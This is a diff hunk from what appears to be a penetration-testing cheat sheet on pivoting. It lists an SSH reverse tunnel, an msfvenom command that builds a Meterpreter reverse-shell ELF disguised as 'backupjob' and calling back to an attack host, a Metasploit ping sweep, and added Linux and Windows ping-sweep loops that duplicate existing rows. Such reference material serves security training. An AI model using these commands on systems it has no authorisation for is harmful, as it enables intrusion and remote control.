@@ -23,6 +23,8 @@
 | `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN` | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port `8080` on the attack host to port `80` on the target. |
 | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080` | Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after `LHOST=` on port 8080 (`LPORT=8080`). Payload takes the form of an executable elf file called backupjob. |
 | `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`  | Metasploit command that runs a ping sweep module against the specified network segment (`RHOSTS=172.16.5.0/23`). |
+| `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done` | Ping Sweep For Loop on Linux Pivot Hosts. Here are two helpful ping sweep for loop one-liners we could use for Linux-based and Windows-based pivot hosts. |
+| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"` | Windows Ping Sweep For Loop Using CMD batch commands. |
 |                                                              |                                                              |
 | `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done` | For Loop used on a Linux-based system to discover devices in a specified network segment. |
 | `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"` | For Loop used on a Windows-based system to discover devices in a specified network segment. |
